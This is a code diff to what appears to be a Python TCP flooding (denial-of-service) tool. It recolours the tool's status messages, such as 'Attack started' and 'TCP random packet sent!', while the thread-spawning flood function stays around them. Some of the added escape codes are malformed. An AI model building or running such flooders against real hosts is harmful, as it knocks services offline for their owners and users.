@@ -34,7 +34,7 @@ def TCP_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	print('\033[1;34'+"[*]"+'\033[0m'+" Attack started for " + str(attack_time) + " secounds..")
 	
 
 	threads_list = []
@@ -66,11 +66,11 @@ def TCP_ATTACK(threads, attack_time, target):
 				time.sleep(0.25)
 				continue
 			else:
-				print("[+] TCP random packet sent! Payload size: " + str(len(payload)))
+				print('\033[1;32m'+"[+]"+'\033[0m'+" TCP random packet sent! Payload size: " + str(len(payload)))
 
 	# Start threads
 	for thread in range(threads):
-		print("[#] Staring thread " + str(thread))
+		print('\033[1;34'+"[*]"+'\033[0m'+" Staring thread " + str(thread) + "...")
 		t = Thread(target = tcp_flood)
 		t.start()
 		threads_list.append(t)
@@ -81,4 +81,4 @@ def TCP_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[!] TCP attack stopped!")
+	print('\033[1;33'+"[!]"+'\033[0m'+" TCP attack stopped!")
